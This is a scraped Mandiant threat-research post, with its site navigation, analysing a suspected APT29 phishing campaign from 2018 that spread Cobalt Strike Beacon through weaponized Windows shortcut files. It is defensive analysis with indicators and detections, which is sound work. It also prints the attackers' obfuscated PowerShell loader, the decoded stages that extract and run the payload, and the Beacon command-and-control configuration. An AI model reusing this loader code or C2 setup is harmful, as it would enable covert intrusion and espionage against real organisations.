# Reference for threat actor for "APT 29, Cozy Bear, The Dukes"

**Title**: Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign | Mandiant

**Source**: https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html

## Content
Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign | Mandiant   Skip to main content Mandiant is now part of Google Cloud. Learn More.         Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology.Explore the platformarrow_forward Who's targeting you   Attack Surface Management Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services.Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward  Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter most   Know What Is ExposedIdentify attack surface exposures   Know If You Are PreparedTest and measure your cyber defense program   Know If You Have Been BreachedDetect and respond to breach activity quickly and effectively   Use Case   RansomwareIncrease resilience against multifaceted extortion   Cyber Risk ManagementAdvance your business approach to cyber security   Digital Risk ProtectionPrioritize and focus on threats that matter   Industrial ControlsStrengthen OT and ICS security   Insider ThreatsUncover and manage internal vulnerabilities   Skills GapClose gaps with training and access to expertise   Private Industry   Finance New!Extend your security posture and operationalize resilience   Manufacturing New!Protect against cyber security threats to maintain business continuity   Government   Election SecurityFocus on Election Infrastructure Protection   Government  New!Protect natural services and agencies Mandiant ServicesMitigate threats, reduce risk, and get back to business with the help of leading experts.Learn morearrow_forwardView all services (47)arrow_forward Schedule a consultation   Featured categories   Cyber Security Transformation Establish and activate cyber defenses   Incident Response Tackle breaches confidently   Strategic Readiness Increase resilience to risk   Technical Assurance Test your security program   Expertise On Demand Access to Mandiant Experts   Training   Browse courses Browse on-demand and live training   Mandiant Academy Train your teams to protect effectively Cyber Threat IntelligenceMandiant specializes in cyber threat intelligence, offering products, services, and more to support our mission to defend against cyber crime. Intelligence resourcesarrow_forward  Products   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring visibility into deep, dark, and open web   Services   Intelligence capability development build a comprehensive threat intelligence program   Intelligence Training Develop practical application skills   Executive Briefings Get live, interactive briefings from the frontlines   Advanced Intelligence Access Hire a dedicated analyst for your needs Resource CenterGet the latest insights from cyber security experts at the frontlines of threat intelligence and incident responseM-Trends 2023 reportarrow_forwardmWISEarrow_forward View all resourcesarrow_forward   Resource types   Mandiant Blog Expert perspectives and industry news   Podcasts Interviews, hot topics, and more   Customer Stories Case studies and customer testimonials   Reports Research from the frontlines   Webinars Livestreams and pre-recorded speaker events   Insights Cyber security concepts, methods, and more   Events Upcoming conferences and collaboration   Infographics Visualization of security research and process   Datasheets Information on Mandiant offerings and more   eBooks High-impact cyber security guides   White Papers Cyber security insights and technical expertise CompanyLearn more about us and our mission to help organizations defend against cyber crime.Learn morearrow_forward Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Sign in to Advantage  en  expand_more   English Français Deutsch Italiano 日本 한국어 EspañolGet Started        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow Who is Targeting YouKnow What Is ExposedKnow If You Are PreparedKnow If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise On DemandResourcesResourcesMandiant BlogsCustomer StoriesWebinarsEventsPodcastsReportsInsightsDatasheetsInfographicsWhite PaperseBooksCompanyAbout MandiantCareersMedia CenterPartnersElevateMandiant Gives BackMobile Footer SectionSee what’s new at MandiantGet startedIncident Response HelpContact SalesSupportBlogTop Incident Response Contact sales Support   BlogSupportContact usreport_problemIncident Response Assistance   Breadcrumb Home Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign   Threat Research Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing CampaignMatthew Dunwoody, Andrew Thompson, Ben Withnell, Jonathan Leathery, Michael Matonis, Nick Carr Nov 19, 201810 min read |    Last updated: Nov 04, 2021 Advanced Persistent Threats (APTs)Threat ResearchIntroductionFireEye devices detected intrusion attempts against multiple industries, including think tank, law enforcement, media, U.S. military, imagery, transportation, pharmaceutical, national government, and defense contracting.The attempts involved a phishing email appearing to be from the U.S. Department of State with links to zip files containing malicious Windows shortcuts that delivered Cobalt Strike Beacon.Shared technical artifacts; tactics, techniques, and procedures (TTPs); and targeting connect this activity to previously observed activity suspected to be APT29.APT29 is known to transition away from phishing implants within hours of initial compromise.On November 14, 2018, FireEye detected new targeted phishing activity at more than 20 of our clients across multiple industries.(UPDATE) This campaign has targeted over 20 FireEye customers across: Defense, Imagery, Law Enforcement, Local Government, Media, Military, Pharmaceutical, Think Tank, Transportation, & US Public Sector industries in multiple geographic regions.— FireEye (@FireEye) November 15, 2018The attacker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order to use their infrastructure to send phishing emails. The phishing emails were made to look like secure communication from a Public Affairs official at the U.S. Department of State, hosted on a page made to look like another Department of State Public Affairs official's personal drive, and used a legitimate Department of State form as a decoy. This information could be obtained via publicly available data, and there is no indication that the Department of State network was involved in this campaign. The attacker used unique links in each phishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows shortcut file, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the attacker to blend in with legitimate network traffic.Several elements from this campaign – including the resources invested in the phishing email and network infrastructure, the metadata from the weaponized shortcut file payload, and the specific victim individuals and organizations targeted – are directly linked to the last observed APT29 phishing campaign from November 2016. This blog post explores those technical breadcrumbs and the possible intentions of this activity.Attribution ChallengesConclusive FireEye attribution is often obtained through our Mandiant consulting team's investigation of incidents at compromised organizations, to identify details of the attack and post-compromise activity at victims. FireEye is still analyzing this activity.There are several similarities and technical overlaps between the 14 November 2018, phishing campaign and the suspected APT29 phishing campaign on 9 November 2016, both of which occurred shortly after U.S. elections. However, the new campaign included creative new elements as well as a seemingly deliberate reuse of old phishing tactics, techniques and procedures (TTPs), including using the same system to weaponize a Windows shortcut (LNK) file. APT29 is a sophisticated actor, and while sophisticated actors are not infallible, seemingly blatant mistakes are cause for pause when considering historical uses of deception by Russian intelligence services. It has also been over a year since we have conclusively identified APT29 activity, which raises questions about the timing and the similarities of the activity after such a long interlude.Notable similarities between this and the 2016 campaign include the Windows shortcut metadata, targeted organizations and specific individuals, phishing email construction, and the use of compromised infrastructure. Notable differences include the use of Cobalt Strike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability.During the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads. For example, requests using incorrect HTTP headers reportedly served ZIP archives containing only the benign publicly available Department of State form. It is possible that the threat actor served additional and different payloads depending on the link visited; however, FireEye has only observed two: the benign and Cobalt Strike variations.We provide details of this in the activity summary. Analysis of the campaign is ongoing, and we welcome any additional information from the community.Activity SummaryThe threat actor crafted the phishing emails to masquerade as a U.S. Department of State Public Affairs official sharing an official document. The links led to a ZIP archive that contained a weaponized Windows shortcut file hosted on a likely compromised legitimate domain, jmj[.].com. The shortcut file was crafted to execute a PowerShell command that read, decoded, and executed additional code from within the shortcut file.Upon execution, the shortcut file dropped a benign, publicly available, U.S. Department of State form and Cobalt Strike Beacon. Cobalt Strike is a commercially available post-exploitation framework. The BEACON payload was configured with a modified variation of the publicly available "Pandora" Malleable C2 Profile and used a command and control (C2) domain – pandorasong[.]com – assessed to be a masquerade of the Pandora music streaming service. The customization of the C2 profile may have been intended to defeat less resilient network detection methods dependent on the default configurations. The shortcut metadata indicates it was built on the same or very similar system as the shortcut used in the November 2016 campaign. The decoy content is shown in Figure 1.Figure 1: Decoy document contentSimilarities to Older ActivityThis activity has TTP and targeting overlap with previous activity, suspected to be APT29. The malicious LNK used in the recent spearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29 LNK from November 2016, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d), which was publicly reported by Volexity. The 2018 and 2016 LNK files are similar in structure and code, and contain significant metadata overlap, including the MAC address of the system on which the LNK was created.Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK file. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns.Outlook and ImplicationsAnalysis of this activity is ongoing, but if the APT29 attribution is strengthened, it would be the first activity uncovered from this sophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted by APT29 should take note of this activity. For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical importance if the elusive and deceptive APT29 operators indeed had access to your environment.  Technical DetailsPhishingEmails were sent from DOSOneDriveNotifications-svCT-Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org with the subject Stevenson, Susan N shared "TP18-DS7002 (UNCLASSIFIED)" with you. The distribution of emails varied significantly between the affected organizations. While most targeted FireEye customers received three or fewer emails, some received significantly more, with one customer receiving 136.Each phishing email contained a unique malicious URL, likely for tracking victim clicks. The pattern of this URL is shown in Figure 2.Figure 2: Malicious URL structureOutside of the length of the sender email address, which may have been truncated on some recipient email clients, the attacker made little effort to hide the true source of the emails, including that they were not actually sent from the Department of State. Figure 3 provides a redacted snapshot of email headers from the phishing message.Figure 3: Redacted email headersThe malicious links are known to have served two variants of the file ds7002.zip. The first variant (MD5: 3fccf531ff0ae6fedd7c586774b17a2d), contained ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c). ds7002.lnk was a malicious shortcut (LNK) file that contained an embedded BEACON DLL and decoy PDF, and was crafted to launch a PowerShell command. On execution, the PowerShell command extracted and executed the Cobalt Strike BEACON backdoor and decoy PDF. The other observed variant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy document. The decoy document ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from hxxps://eforms.state.gov/Forms/ds7002.PDF.The BEACON backdoor communicated with the C2 domain pandorasong[.]com (95.216.59[.]92). The domain leveraged privacy protection, but had a start of authority (SOA) record containing vleger@tutanota.com.Our analysis indicates that the attacker started configuring infrastructure approximately 30 days prior to the attack. This is a significantly longer delay than many other attackers we track. Table 1 contains a timeline of this activity.TimeEventSource2018-10-15 15:35:19Zpandorasong[.]com registeredRegistrant Information2018-10-15 17:39:00Zpandorasong[.]com SSL certificate establishedCertificate Transparency2018-10-15 18:52:06ZCobalt Strike server establishedScan Data2018-11-02 10:25:58ZLNK WeaponizedLNK Metadata2018-11-13 17:58:41Z3fccf531ff0ae6fedd7c586774b17a2d modifiedArchive Metadata2018-11-14 01:48:34Z658c6fe38f95995fa8dc8f6cfe41df7b modifiedArchive Metadata2018-11-14 08:23:10ZFirst observed phishing e-mail sentTelemetryTable 1: Operational timelineExecutionUpon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), the following PowerShell command was executed:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep bypass$zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJEVudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUpO30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2enZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZCgkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFycmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.Encoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia;This command included some specific obfuscation, which may indicate attempts to bypass specific detection logic. For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64.The decoded command consisted of additional PowerShell that read the content of ds7002.lnk from offset 0x5e2be to offset 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content. The embedded PowerShell code decoded to the following:$ptgt=0x0005e2be;$vcq=0x000623b6;$tb="ds7002.lnk";if (-not(Test-Path $tb)){$oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse;if (-not $oe){   exit}[IO.Directory]::SetCurrentDirectory($oe.DirectoryName);}$vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite';$oe=New-Object byte[]($vcq-$ptgt);$r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin);$r=$vzvi.Read($oe,0,$vcq-$ptgt);$oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length);$zk=[Text.Encoding]::ASCII.GetString($oe);iex $zk;When the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it's clear that similarities still exist. However, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the script.Figure 4: Shared functions to loader in older activity (XOR decode function and CopyFilePart)The PowerShell loader code is obfuscated, but a short de-obfuscated snippet is shown as follows. The decoy PDF and BEACON loader DLL are read from specific offsets within the LNK, decoded, and their contents executed. The BEACON loader DLL is executed with the export function "PointFunctionCall":[TRUNCATED]$jzffhy = [IO.FileAccess]::READ$gibisec = myayxvj $("ds7002.lnk")$oufgke = 0x48bd8$wabxu = 0x5e2be - $oufgke$lblij = bygtqi $gibisec $oufgke $wabxu $("%TEMP%\ds7002.PDF") Invoke-Item$((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35))$oufgke = 0x0dd8$wabxu = 0x48bd8 - $oufgke$yhcgpw = bygtqi $gibisec $oufgke $wabxu $("%LOCALAPPDATA%\cyzfc.dat") if($ENV:PROCESSOR_ARCHITECTURE -eq $("AMD64")) { & ($("rundll32.exe")) $(",")$("PointFunctionCall") }Files DroppedUpon successful execution of the LNK file, it dropped the following files to the victim's system:%APPDATA%\Local\cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b)BEACON loader DLL%TEMP%\ds7002.PDF (MD5: 313f4808aa2a2073005d219bc68971cd)Decoy documentThe dropped BEACON loader DLL was executed by RunDll32.exe using the export function "PointFunctionCall":"C:\Windows\system32\rundll32.exe"C:\Users\Administrator\AppData\Local\cyzfc.dat, PointFunctionCallThe BEACON payload included the following configuration:authorization_id: 0x311168cdns_sleep: 0http_headers_c2_post_req:  Accept: */*  Content-Type: text/xml  X-Requested-With: XMLHttpRequest  Host: pandorasong.comhttp_headers_c2_request:  Accept: */*  GetContentFeatures.DLNA.ORG: 1  Host: pandorasong[.]com  Cookie:  __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;jitter: 17named_pipes: \\\\%s\\pipe\\msagent_%xprocess_inject_targets:  %windir%\\syswow64\\rundll32.exe  %windir%\\sysnative\\rundll32.exebeacon_interval: 300c2:  conntype: SSL  host: pandorasong[.]com  port: 443c2_urls:  pandorasong[.]com/radio/xmlrpc/v45  pandorasong[.]com/access/c2_user_agents: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like GeckoNetwork CommunicationsAfter successful installation/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via TCP/443 SSL. The sample was configured to use a malleable C2 profile for its network communications. The specific profile used appears to be a modified version of the publicly available Pandora C2 profile. The profile may have been changed to bypass common detections for the publicly available malleable profiles. The following is a sample GET request:GET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpepBdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjdMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbgagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbckoHTTP/1.1Accept: */*GetContentFeatures.DLNA.ORG: 1Host: pandorasong.comCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) likeGeckoConnection: Keep-AliveCache-Control: no-cacheSimilarities to Older ActivityFigure 5 and Figure 6 show the overlapping characteristics between the LNK used in the recent spear phish emails, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), compared to a suspected APT29 LNK from the November 2016 attack that led to the SPIKERUSH backdoor, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d).Figure 5: LNK characteristics: new activity (left) and old activity (right)Figure 6: LNK characteristics: new activity (left) and old activity (right)In addition to similar LNK characteristics, the PowerShell command is very similar to the code from the older sample that executed the SPIKERUSH backdoor. Some of the same variable names are retained in this new version, as seen in Figure 7 and Figure 8.Figure 7: Embedded PowerShell: new activity (left) and old activity (right)Figure 8: Shared string obfuscation logic: new LNK activity (left) and old VERNALDROP activity (right)IndicatorsIndicatorDescriptiondosonedrivenotifications-svct-mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]orgPhishing email address from likely compromised legitimate serverStevenson, Susan N shared "TP18-DS7002 (UNCLASSIFIED)" with youPhishing email subjecthttps://www.jmj[.]com/personal/nauerthn_state_gov/*Malware hosting location on likely compromised legitimate domainpandorasong[.]comBEACON C295.216.59[.]92Resolution of pandorasong[.]com2b13b244aafe1ecace61ea1119a1b2eeSSL certificate for pandorasong[.]com3fccf531ff0ae6fedd7c586774b17a2dMalicious ZIP archive MD5658c6fe38f95995fa8dc8f6cfe41df7bBenign ZIP archive MD56ed0020b0851fb71d5b0076f4ee95f3cMalicious LNK file MD5313f4808aa2a2073005d219bc68971cdBenign decoy PDF MD516bbc967a8b6a365871a05c74a4f345bBEACON DLL MD5%APPDATA%\Local\cyzfc.datBEACON DLL file path%TEMP%\ds7002.PDFBenign decoy PDF file pathTable 2: IndicatorsRelated Samples37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d)FireEye DetectionFireEye detected this activity across our platform. Table 3 contains the specific detection names that applied to this activity.ProductDetection namesNetwork SecurityMalware.ArchiveMalware.Binary.lnkSuspicious.Backdoor.BeaconEndpoint SecuritySUSPICIOUS POWERSHELL USAGE (METHODOLOGY)Generic.mg.16bbc967a8b6a365Threat Analytics PlatformWINDOWS METHODOLOGY [PowerShell Base64 String]WINDOWS METHODOLOGY [Rundll32 Roaming]WINDOWS METHODOLOGY [PowerShell Script Block Warning]WINDOWS METHODOLOGY [Base64 Char Args]TADPOLE DOWNLOADER [Rundll Args]INTEL HIT - IP [Structured Threat Reputation-Based]INTEL HIT - FQDN [Structured Threat Reputation-Based] [DNS]INTEL HIT - FQDN [Structured Threat Reputation-Based] [Non-DNS]INTEL HIT - FILE HASH [Structured Threat Reputation-Based]Table 3: FireEye product detections Link to RSS feedPrepare for 2024's cybersecurity landscape.Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon. Download now  Have questions? Let's talk.Mandiant experts are ready to answer your questions. Contact Us  Follow us Footer Mandiant Advantage Platform Platform Overview Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Customer Success Media Inquiries  REPORTMandiant frontline observations provide insights into today’s top cyber defense topics.Learn about the 4 critical areas.  Get the Report  © Copyright 2024 Mandiant. All rights reserved.Bottom Website Privacy Policy Terms & Conditions Compliance Site Map  